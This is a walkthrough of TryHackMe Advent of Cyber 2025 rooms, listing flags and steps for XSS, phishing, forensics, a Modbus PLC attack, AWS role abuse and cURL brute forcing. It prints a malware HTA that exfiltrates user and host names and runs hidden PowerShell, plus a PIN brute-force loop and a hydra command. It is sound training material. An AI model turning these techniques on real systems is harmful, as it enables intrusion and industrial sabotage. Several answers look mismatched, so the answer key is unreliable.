>A Stored XSS attack occurs when malicious script is saved on the server and then loaded for every user who views the affected page. Unlike Reflected XSS, which targets individual victims, Stored XSS becomes a "set-and-forget" attack, anyone who loads the page runs the attacker’s script.

**Ans:** `stored`

#### 2) What's the reflected XSS flag?

*Enter the following script in the `Search Results` box and run it:*

```
<script>alert('Reflected Meow Meow')</script>
```

**Ans:** `THM{Evil_Bunny}`

#### 3) What's the stored XSS flag?

*Enter the following script in the `Send a Message to McSkidy` box and run it:*

```
<script>alert('Stored Meow Meow')</script>
```

**Ans:** `THM{Evil_Stored_Egg}`

---
# Phishing - Phishing Greetings

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Spotting Phishing Emails

#### 1) Classify the 1st email. What's the flag?

*Its a `Phishing` email. The correct options are `Spoofing` , `Fake Invoice`, `Sense of Urgency`*

**Ans:** `THM{yougotnumber1-keep-it-going}`

#### 2) Classify the 2nd email. What's the flag?

*Its a `Phishing` email. The correct options are `Impersonation` , `Spoofing`, `Malicious Attatchment`*

**Ans:** `THM{nmumber2-was-not-tha-thard!}`

#### 3) Classify the 3rd email. What's the flag?

*Its a `Phishing` email. The correct options are `Impersonation` , `Sense of Urgency`, `Social Engineering Text`*

**Ans:** `THM{Impersonation-is-areal-thing-keepIt}`

#### 4) Classify the 4th email. What's the flag?

*Its a `Phishing` email. The correct options are `Impersonation` , `External Sender Domain`, `Social Engineering Text`*

**Ans:** `THM{Get-back-SOC-mas!!}`

#### 5) Classify the 5th email. What's the flag?

*This ones just a `spam`.*

**Ans:** `THM{It-was-just-a-sp4m!!}`

#### 6) Classify the 6th email. What's the flag?

*Its a `Phishing` email. The correct options are `Impersonation` , `Typosquatting/Punycodes`, `Social Engineering Text`*

**Ans:** `THM{number6-is-the-last-one!-DX!}`

---
# YARA Rules - YARA mean one!

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Yara Rules

#### 1) How many images contain the string TBFC?

*First, I  devised a simple rule:*

```
nano tbfc.yara
```

```bash
rule TBFC
{
    meta:
        description = "Find TBFC keyword message left by McSkidy"
        author = "Blue Team"

    strings:
        $tbfc = /TBFC:[A-Za-z0-9]+/

    condition:
        $tbfc
}
```

*Then, I saved and ran it:*

```bash
ubuntu@tryhackme:~$ yara -r tbfc.yar /home/ubuntu/Downloads/easter
TBFC /home/ubuntu/Downloads/easter/easter46.jpg
TBFC /home/ubuntu/Downloads/easter/easter52.jpg
TBFC /home/ubuntu/Downloads/easter/easter25.jpg
TBFC /home/ubuntu/Downloads/easter/easter10.jpg
TBFC /home/ubuntu/Downloads/easter/easter16.jpg
```

**Ans:** `5`

#### 2) What regex would you use to match a string that begins with...?

**Ans:** `TBFC:[A-Za-z0-9]+`

*The slashes `/ /` denote a regular expression in YARA, allowing pattern-based matching.  
The regex `TBFC:[A-Za-z0-9]+` matches the literal prefix `TBFC:` followed by one or more ASCII alphanumeric characters, enabling detection of variable-length encoded messages.*
#### 3) What is the message sent by McSkidy?

*I ran the rule again using the `-s` parameter:*

```bash
ubuntu@tryhackme:~$ yara -r -s tbfc.yar /home/ubuntu/Downloads/easter
TBFC /home/ubuntu/Downloads/easter/easter46.jpg
0x2f78a:$tbfc: TBFC:HopSec
TBFC /home/ubuntu/Downloads/easter/easter52.jpg
0x2a2ad2:$tbfc: TBFC:Island
TBFC /home/ubuntu/Downloads/easter/easter16.jpg
0x3bb7f7:$tbfc: TBFC:me
TBFC /home/ubuntu/Downloads/easter/easter10.jpg
0x137da8:$tbfc: TBFC:Find
TBFC /home/ubuntu/Downloads/easter/easter25.jpg
0x42c778:$tbfc: TBFC:in
```

**Ans:** `Find me in HopSec Island`

---
# Containers - DoorDasher's Demise

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Container Security

#### 1) What exact command lists running Docker containers?

**Ans:** `docker ps`

#### 2) What file is used to define the instructions for building a Docker image?

**Ans:** `dockerfile`

#### 3) What's the flag?

*I navigated to the root directory and found the flag:*

```bash
deployer@25babd229036:~$ cd ..
deployer@25babd229036:/home$ ls
deployer
deployer@25babd229036:/home$ cd ..
deployer@25babd229036:/$ ls
app  boot  etc       home  lib32  libx32  mnt  proc                root  sbin  sys  usr
bin  dev   flag.txt  lib   lib64  media   opt  recovery_script.sh  run   srv   tmp  var
deployer@25babd229036:/$ cat flag.txt 
THM{DOCKER_ESCAPE_SUCCESS}
```

**Ans:** `THM{DOCKER_ESCAPE_SUCCESS}`

#### 4) Bonus Question: There is a secret code contained...?

*Well I expected this to be harder but apparently its just the red bold texts combined.*

**Ans:** `DeployMaster2025!`

---
# Web Attack Forensics - Drone Alone

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Web Attack Forensics 

*Decoding the base64 string gives:*

`This is now Mine! MUAHAAHAA`

#### 1) What is the reconnaissance executable file name?

**Ans:** `whoami.exe`

>Attackers often use the `whoami` command immediately after gaining code execution to determine which user account their malicious process is running as.

#### 2) What executable did the attacker attempt to run through...?

*The following query helps to uncover malicious activity and reveals the executable:*

```
index=windows_apache_error ("cmd.exe" OR "powershell" OR "Internal Server Error")
```

**Ans:** `PowerShell.exe`

---
# Forensics - Registry Furensics

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Investigate the Gifts Delivery Malfunctioning

*Navigating via the bookmarks is very helpful - just a tip*
#### 1) What application was installed on the `dispatch-srv01` before...?

*Following the table, I first imported the `Software` hive and then  checked the following location for installed applications and noticed something out of the ordinary:*

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`

`DroneManager Updater (64-bit)``

**Ans:** `DroneManager Updater`

#### 2) What is the full path where the user launched the application from?

*I imported the `NTUSER>DAT` hive and searched the following path:*

`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`

*To make things easier I searched for `drone` in the search bar and voila:*

`C:\Users\dispatch.admin\Downloads\DroneManager_Setup.exe`

**Ans:** `dockerfile`

#### 3) Which value was added by the application to maintain persistence on startup?

*I went back to the `Software` hive and looked at the following path:*

`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`

*This was the suspicious value - `drone helper`*

**Ans:** `"C:\Program Files\DroneManager\dronehelper.exe" --background`

---
# CyberChef - Hoperation Save McSkidy

## Task  1 & 2

No answer needed

---
## Task  3 - First Lock - Outer Gate

#### 1) What is the password for the first lock?

*The guard's name in base64 is `Q290dG9uVGFpbA==`*

*The magic question - `What is the password for this level?`*

*Encoded magic question - `V2hhdCBpcyB0aGUgcGFzc3dvcmQgZm9yIHRoaXMgbGV2ZWw/`*

*Response (Decoded) - `Here is the password: SWFtc29mbHVmZnk=`*

*Single from base64 - `Iamsofluffy`*

*The username is in base64 and the password is single from base64 conversion.*

**Ans:** `Iamsofluffy`

## Task  4 - Second Lock - Outer  Wall

#### 1) What is the password for the second lock?

*The guard's name in base64 is `Q2Fycm90SGVsbQ==`*

*The magic question - `Did you change the password?`*

*Encoded magic question - `RGlkIHlvdSBjaGFuZ2UgdGhlIHBhc3N3b3JkPw==`*

*Response (Decoded) - `Here is the password: U1hSdmJHUjViM1YwYjJOb1lXNW5aV2wwSVE9PQ==`*

*Double from base64 - `Itoldyoutochangeit!`*

*The username is in base64 and the password is double from base64 conversion.*

**Ans:** `Iamsofluffy`

## Task  5 - Third Lock - Guard House

#### 1) What is the password for the third lock?

*The guard's name in base64 is `TG9uZ0VhcnM=`*

*The magic question - `Password please`*

*Encoded magic question - `UGFzc3dvcmQgcGxlYXNl`*

*Response (Decoded) - `Here is the password: IQwFFjAWBgsf`*

*Key - `cyberchef`*

*From base64 to XOR Password with Key - `BugsBunny`*

*The username is in base64 and the password is base64 to XOR conversion.*

**Ans:** `BugsBunny`

## Task  6 - Fourth Lock - Inner Castle

#### 1) What is the password for the fourth lock?

*The guard's name in base64 is `TGVubnk=`*

*The magic question - `Password please`*

*Encoded magic question - `UGFzc3dvcmQgcGxlYXNl`*

*Response (Decoded) - `Here is the password: b4c0be7d7e97ab74c13091b76825cf39`*

*MD5 cracked password - `passw0rd1`*

*The username is in base64 and the password is the cracked md5 hash*

**Ans:** `BugsBunny`

## Task  7 - Fifth Lock - Prison Tower

#### 1) What is the password for the fifth lock?

*The guard's name in base64 is `Q2FybA==`*

*The magic question - `Password please`*

*Encoded magic question - `UGFzc3dvcmQgcGxlYXNl`*

*Response (Decoded) - `Here is the password: ZTN4cDB5T3VwNDNlT2UxNQ==`*

*Recipe - `1`*

*Key - `cyberchef`*

*From Base64 ⇒ Reverse ⇒ ROT13 converted password - `51rBr34chBl0ck3r`*

*The username is in base64 and the password is the From Base64 ⇒ Reverse ⇒ ROT13 converted password.*

**Ans:** `51rBr34chBl0ck3r`
#### 2) What is the retrieved flag?

**Ans:** `THM{M3D13V4L_D3C0D3R_4D3P7}`

---
# Obfuscation - The Egg Shell File

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Obfuscation & Deobfuscation

#### 1) What is the first flag you get after deobfuscating...?

*Using the `From Base64` conversion, I got - `https://c2.northpole.thm/exfil`*

*After running the script I got: `THM{C2_De0bfuscation_29838}`*

**Ans:** `THM{C2_De0bfuscation_29838}

#### 2) What is the second flag you get after obfuscating...?

*Using the `XOR` followed by the `To Hex` conversion, I got - `74 76 79 73 6e 1a 74 76 79 72 1a 76 67 7e 1a 7c 72 6e`*

*After running the script I got: `THM{API_Obfusc4tion_ftw_0283}`*

**Ans:** `THM{API_Obfusc4tion_ftw_0283}`

---
# ICS/Modbus - Claus for Concern

## Task  1 - Introduction 

No answer needed

---
## Task  2 - SCADA (Supervisory Control and Data Acquisition)

#### 1) What port is commonly used by Modbus TCP?

**Ans:** `502`

## Task  3 - PLC & Modbus Protocol

*This was a simple room in terms of the work you have to do to get the flag but it packs a lot of information.*
#### 1) What's the flag?

*Run the following script with python3, make sure to change the Ip if you are copying this.*

```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
import time

PLC_IP = "10.49.128.22"
PORT = 502
UNIT_ID = 1

def read_coil(client, address):
    result = client.read_coils(address=address, count=1, slave=UNIT_ID)
    if not result.isError():
        return result.bits[0]
    return None

def read_register(client, address):
    result = client.read_holding_registers(address=address, count=1, slave=UNIT_ID)
    if not result.isError():
        return result.registers[0]
    return None

# Connect to PLC
client = ModbusTcpClient(PLC_IP, port=PORT)

if not client.connect():
    print("Failed to connect to PLC")
    exit(1)

print("=" * 60)
print("TBFC Drone System - Christmas Restoration")
print("=" * 60)
print()

# Step 1: Check current state
print("Step 1: Verifying current system state...")
time.sleep(1)

package_type = read_register(client, 0)
protection = read_coil(client, 11)
armed = read_coil(client, 15)

print(f"  Package Type: {package_type} (1 = Eggs)")
print(f"  Protection Active: {protection}")
print(f"  Self-Destruct Armed: {armed}")
print()

# Step 2: Disable protection
print("Step 2: Disabling protection mechanism...")
time.sleep(1)

result = client.write_coil(11, False, slave=UNIT_ID)
if not result.isError():
    print("  Protection DISABLED")
    print("  Safe to proceed with changes")
else:
    print("  FAILED to disable protection")
    client.close()
    exit(1)

print()
time.sleep(1)

# Step 3: Change package type to Christmas
print("Step 3: Setting package type to Christmas presents...")
time.sleep(1)

result = client.write_register(0, 0, slave=UNIT_ID)
if not result.isError():
    print("  Package type changed to: Christmas Presents")
else:
    print("  FAILED to change package type")

print()
time.sleep(1)

# Step 4: Enable inventory verification
print("Step 4: Enabling inventory verification...")
time.sleep(1)

result = client.write_coil(10, True, slave=UNIT_ID)
if not result.isError():
    print("  Inventory verification ENABLED")
else:
    print("  FAILED to enable verification")

print()
time.sleep(1)

# Step 5: Enable audit logging
print("Step 5: Enabling audit logging...")
time.sleep(1)

result = client.write_coil(13, True, slave=UNIT_ID)
if not result.isError():
    print("  Audit logging ENABLED")
    print("  Future changes will be logged")
else:
    print("  FAILED to enable logging")

print()
time.sleep(2)

# Step 6: Verify restoration
print("Step 6: Verifying system restoration...")
time.sleep(1)

christmas_restored = read_coil(client, 14)
new_package_type = read_register(client, 0)
emergency_dump = read_coil(client, 12)
self_destruct = read_coil(client, 15)

print(f"  Package Type: {new_package_type} (0 = Christmas)")
print(f"  Christmas Restored: {christmas_restored}")
print(f"  Emergency Dump: {emergency_dump}")
print(f"  Self-Destruct Armed: {self_destruct}")
print()

if christmas_restored and new_package_type == 0 and not emergency_dump and not self_destruct:
    print("=" * 60)
    print("SUCCESS - CHRISTMAS IS SAVED")
    print("=" * 60)
    print()
    print("Christmas deliveries have been restored")
    print("The drones will now deliver presents, not eggs")
    print("Check the CCTV feed to see the results")
    print()
    
    # Read the flag from registers
    flag_result = client.read_holding_registers(address=20, count=12, slave=UNIT_ID)
    if not flag_result.isError():
        flag_bytes = []
        for reg in flag_result.registers:
            flag_bytes.append(reg >> 8)
            flag_bytes.append(reg & 0xFF)
        flag = ''.join(chr(b) for b in flag_bytes if b != 0)
        print(f"Flag: {flag}")
    
    print()
    print("=" * 60)
else:
    print("Restoration incomplete - check system state")

client.close()
print()
print("Disconnected from PLC")
```

**Ans:** `THM{eGgMas0V3r}`

---
# Race Conditions - Toy to The World

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Race Condition

*This was a pretty straightforward room, all the instructions are already given in the task and hence I'm not going to mention anything extra as its not required.*
#### 1) What is the flag value once the stocks are negative for **SleighToy Limited Edition**?

**Ans:** `THM{WINNER_OF_R@CE007}`

#### 2) What is the flag value once the stocks are negative for **Bunny Plush (Blue)**?

**Ans:** `THM{WINNER_OF_Bunny_R@ce}`

---
# Malware Analysis - Malhare.exe

## Task  1 - Introduction 

No answer needed

---
## Task  2 -  Malware Analysis
#### 1) What is the title of the HTA application?

```html
<title>Best Festival Company Developer Survey</title>
```

**Ans:** `Best Festival Company Developer Survey`

#### 2) What VBScript function is acting as if it is downloading the survey questions?

```html
Sub Window_onLoad
		Call getQuestions()
```

**Ans:** `getQuestions`

#### 3) What URL domain (including sub-domain) is the...?

```html
Function getQuestions()
		Dim IE, result, decoded, decodedString
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/survey_questions.txt"
		Do While IE.ReadyState < 4
		Loop
		result = IE.document.body.innerText
		IE.quit 
```

**Ans:** `THM{WINNER_OF_Bunny_R@ce}`

#### 4) Malhare seems to be using typosquatting, domains...?

```
bestfestiivalcompany
```

*Looking closely - there are two `i`*

**Ans:** `i`

#### 5) How many questions does the survey have?

```html
<h3>How long have you been employed at Best Festival Company?</h3>
			<label><input type="radio" name="q1"/> Less than 1 year</label><br />
			<label><input type="radio" name="q1"/> Less than 2 years</label><br />
			<label><input type="radio" name="q1"/> 2 years or more</label>
									
			<h3>Do you feel valued at work?</h3>
			<label><input type="radio" name="q2" />Yes</label><br />
			<label><input type="radio" name="q2" />No</label><br />
			<label><input type="radio" name="q2" />Indecisive</label>
			
			<h3>Do you feel content with your current salary?</h3>
			<label><input type="radio" name="q3" />Yes</label><br />
			<label><input type="radio" name="q3" />No</label><br />
			<label><input type="radio" name="q3" />Indecisive</label>
			
			<h3>By how much do you believe your salary should increase?</h3>
			<label><input type="radio" name="q4" />Up to 5%</label><br />
			<label><input type="radio" name="q4" />Between 5% and 10%</label><br />
			<label><input type="radio" name="q4" />Between 10% and 15%</label><br />
			<label><input type="radio" name="q4" />More that 10%</label><br />	
```

**Ans:** `4`

#### 6) The survey entices participation by promising a chance to win a trip to where?

```html
<div>All participants will be entered into a prize draw for a chance to win a trip to the South Pole!</div>
```

**Ans:** `South Pole`

#### 7) What two pieces of information about the computer it is...?

```html
Function provideFeedback(feedbackString)	
		Dim strHost, strUser, strDomain
		On Error Resume Next
		strHost = CreateObject("WScript.Network").ComputerName
		strUser = CreateObject("WScript.Network").UserName
```

**Ans:** `ComputerName,UserName`

#### 8) What endpoint is the enumerated data being exfiltrated to?

```html
Dim IE
		Set IE = CreateObject("InternetExplorer.Application")
		IE.navigate2 "http://survey.bestfestiivalcompany.com/details?u=" & strUser & "?h=" & strHost
		Do While IE.ReadyState < 4
		Loop
		IE.quit	
```

**Ans:** `/details`

#### 9) What HTTP method is being used to exfiltrate the data?

**Ans:** `GET`

#### 10) What is the line of code that executes the contents of the download?

```html
Set runObject = CreateObject("Wscript.Shell")
		runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False
```

**Ans:** `runObject.Run "powershell.exe -nop -w hidden -c " & feedbackString, 0, False`

#### 11) What popular encoding scheme was used in an attempt...?

*Using the `Magic` option in cyberchef this seemed to be base64.*

**Ans:** `base64`

#### 12) What common encryption scheme was used in the script?

*The decoded payload:*

```html
function AABB {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Text
    )

    $sb = New-Object System.Text.StringBuilder $Text.Length
    foreach ($ch in $Text.ToCharArray()) {
        $c = [int][char]$ch

        if ($c -ge 65 -and $c -le 90) {           
            $c = (($c - 65 + 13) % 26) + 65
        }
        elseif ($c -ge 97 -and $c -le 122) {      
            $c = (($c - 97 + 13) % 26) + 97
        }

        [void]$sb.Append([char]$c)
    }
    $sb.ToString()
}

$flag = 'GUZ{Znyjner.Nanylfrq}'

$deco = AABB -Text $flag
Write-Output $deco
```

*Upon closer inspection of how the characters are manipulated this was pretty obvious `$c - 65 + 13`. The characters are shifted by 13.*

**Ans:** `rot13`

#### 13) What is the flag value?

*I decoded the value using `ROT13` in cyberchef.*

**Ans:** `THM{Malware.Analysed}

---
# C2 Detection - Command & Carol

## Task  1 - Introduction 

No answer needed

---
## Task  2 - Detecting C2 with RITA

*I followed the instructions given in the task for the `rita_challenge.pcap`*
#### 1) How many hosts are communicating with **malhare.net**?

**Ans:** `6`

#### 2) Which Threat Modifier tells us the number of hosts...?

**Ans:** `prevalence`

#### 3) What is the highest number of connections to **rabbithole.malhare.net**?

*I used the arrow keys to analyse different connection data. The highest was from the source `10.0.0.15`*

**Ans:** `40`

#### 4) Which search filter would you use to search for all...?

*I use the "/" to go into search mode and then the "?" character to see the filter overview and help me type it out. There is an example mentioned which make it helpful.*

**Ans:** `dst:rabbithole.malhare.net beacon:>=70 sort:duration-desc `

#### 5) Which port did the host 10.0.0.13 use to connect to **rabbithole.malhare.net**?

*The `Port:` field mentions `80`*

**Ans:** `80`

---
# AWS Security - S3cret Santa

## Task  1 - Introduction 

#### 1) What is the number shown for the "Account" parameter?

*Running `aws sts get-caller-identity` gave me:*

**Ans:** `123456789012`

---
## Task  2 - IAM: Users, Roles, Groups and Policies

#### 1) What IAM component is used to describe the...?

**Ans:** `policy`

---
## Task  3 - Practical: Enumerating a User's Permissions

#### 1) What is the name of the policy assigned to `sir.carrotbane`?

*Listing policies gave me the following:*

```bash
ubuntu@tryhackme:~$ aws iam list-user-policies --user-name sir.carrotbane
{
    "PolicyNames": [
        "SirCarrotbanePolicy"
    ]
}

```

*Following that, I looked at the permissions using:*

```bash
aws iam get-user-policy --policy-name SirCarrotbanePolicy --user-name sir.carrotbane
```

```bash
{
    "UserName": "sir.carrotbane",
    "PolicyName": "SirCarrotbanePolicy",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": [
                    "iam:ListUsers",
                    "iam:ListGroups",
                    "iam:ListRoles",
                    "iam:ListAttachedUserPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:ListAttachedRolePolicies",
                    "iam:GetUserPolicy",
                    "iam:GetGroupPolicy",
                    "iam:GetRolePolicy",
                    "iam:GetUser",
                    "iam:GetGroup",
                    "iam:GetRole",
                    "iam:ListGroupsForUser",
                    "iam:ListUserPolicies",
                    "iam:ListGroupPolicies",
                    "iam:ListRolePolicies",
                    "sts:AssumeRole"
                ],
                "Effect": "Allow",
                "Resource": "*",
                "Sid": "ListIAMEntities"
            }
        ]
    }
}
```

**Ans:** `policy`

---
## Task 4 - Assuming Roles

#### 1) Apart from GetObject and ListBucket, what other action can be...?

*Running this command `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC` gave me:*

```bash
{
    "Credentials": {
        "AccessKeyId": "ASIARZPUZDIXXXX",
        "SecretAccessKey": "dHXpkubCXXXX",
        "SessionToken": "FQoGZXIvYXdzEBYaDs3IXXXXX",
        "Expiration": "2025-12-23T19:00:05.684942+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROARZPUZDIKFLCQZSU7D:TBFC",
        "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
    },
    "PackedPolicySize": 6
}

```

*I then exported it using the following commands:*

```bash
ubuntu@tryhackme:~$ export AWS_ACCESS_KEY_ID="ASIARZPUZDIXXXX"
ubuntu@tryhackme:~$ export AWS_SECRET_ACCESS_KEY="dHXpkubC/xUQrsW1hj8h6rYIPZIq7NjzyMAPIiQG"
ubuntu@tryhackme:~$ export AWS_SESSION_TOKEN="FQoGZXIvYXdzEBYaDs3IXXXX"
```

*Running the command to get caller identity again:*

```bash
ubuntu@tryhackme:~$ aws sts get-caller-identity
{
    "UserId": "AROARZPUZDIXXXX",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/bucketmaster/TBFC"
}
```

*The answer to this task can be gotten from reading the task output blocks*

**Ans:** `ListAllMyBuckets`

---
## Task  5 - Grabbing a file from S3

#### 1) What are the contents of the cloud_password.txt file?

*I ran the commands mentioned in the task and then viewed the contents:*

```bash
ubuntu@tryhackme:~$ aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt
{
    "AcceptRanges": "bytes",
    "LastModified": "2025-12-23T17:49:08+00:00",
    "ContentLength": 29,
    "ETag": "\"c63e1474bf79a91ef95a1e6c8305a304\"",
    "ContentType": "application/octet-stream",
    "Metadata": {}
}
ubuntu@tryhackme:~$ ls
 Desktop     Downloads   Pictures   Templates   Videos               snap
 Documents   Music       Public    'VM 5.png'   cloud_password.txt
ubuntu@tryhackme:~$ cat cloud_password.txt 
THM{more_like_sir_cloudbane}
```

**Ans:** `THM{more_like_sir_cloudbane}`

---
# Exploitation with cURL - Hoperation Eggsploit

## Task  1 - Introduction 

No answer needed

---
## Task  2 -  Web Hacking Using cURL
#### 1) What is the flag you receive

*I used the following command:*

```bash
curl -i -X POST -d "username=admin&password=admin" http://10.49.165.190/post.php
```

**Ans:** `THM{curl_post_success}`

#### 2) Reuse that saved cookie at the same endpoint. What is the flag your receive?

*First, I set the cookies and then reused them:*

```bash
curl -c cookies.txt -d "username=admin&password=admin" http://10.49.165.190/cookie.php
```

```bash
curl -b cookies.txt http://10.49.165.190/cookie.php
Welcome back, admin!
```

**Ans:** `THM{session_cookie_master}`

#### 3) What is the password of the `admin` user?

*This one is pretty straightforward, I just followed the instructions given in the showcase of the task and ran the bruteforce attack.*

**Ans:** `secretpass`

#### 4) What is the flag you receive?

*I ran the following command:*

```bash
curl -A "TBFC" http://10.49.165.190/agent.php
```

**Ans:** `THM{user_agent_filter_bypassed}`

#### 5) Can you solve the Final Mission and get the flag? (Bonus)

*I first with a simple curl scan which gave me this:*

```
root@ip-10-49-76-116:~# curl http://10.49.165.190/terminal.php?action=panel
<h2>Access denied</h2><p>This admin panel is terminal-only and is only accessible using secretcomputer</p>root@ip-10-49-76-116:
```

*I then modified the `user-agent` and ran it again.*

```
root@ip-10-49-76-116:~# curl -A "secretcomputer"  http://10.49.165.190/terminal.php?action=panel
{
    "service": "Wormhole Control Panel",
    "endpoints": {
        "\/terminal.php?action=info": "Public info",
        "\/terminal.php?action=login": "POST: username,password",
        "\/terminal.php?action=pin": "POST: attempt PIN to get temporary admin token",
        "\/terminal.php?action=status": "GET: wormhole status",
        "\/terminal.php?action=close": "POST: close wormhole"
    },
    "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
```

*I then devised a simple loop to go through the different pins:*

```bash
for pin in {4000..5000}; do 
    echo "Testing PIN: $pin"; 
    response=$(curl -s -A "secretcomputer" -X POST -d "pin=$pin" http://10.49.165.190/terminal.php?action=pin)
    echo "$response"
    
    if echo "$response" | grep -q "token\|success"; then
        echo "Found correct PIN: $pin";
        echo "$response"
        break
    fi
    echo ""
done
```

*Which in turn gave me the correct pin - `4731`*

```json
{
    "status": "ok",
    "operator_token": "f86402a3dcd3cf82ab23ce475ab8fdbd532060ac073b3294eb3195ae1d9712af",
    "note": "This token is valid for the day. Use it as Bearer or X-Operator header."
}
```

*When I tried sending the token, I was met with the following message:*

```
root@ip-10-49-76-116:~# curl -A "secretcomputer" -X POST \
>   -H "Authorization: Bearer f86402a3dcd3cf82ab23ce475ab8fdbd532060ac073b3294eb3195ae1d9712af" \
>   http://10.49.165.190/terminal.php?action=close
{
    "status": "denied",
    "msg": "Missing admin session, operator token, or X-Force header. All three required."
```

*Then, I tried to find the credentials using `hydra`:*

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 64 10.49.165.190 http-post-form "/terminal.php?action=login:username=^USER^&password=^PASS^:F=fail:H=User-Agent: secretcomputer"
```

*.....and I ran out patience unfortunately it kept going. Either my command is wrong or I'm missing something out. I might come back to this later.*

And thats the end of AOC 2025...

---


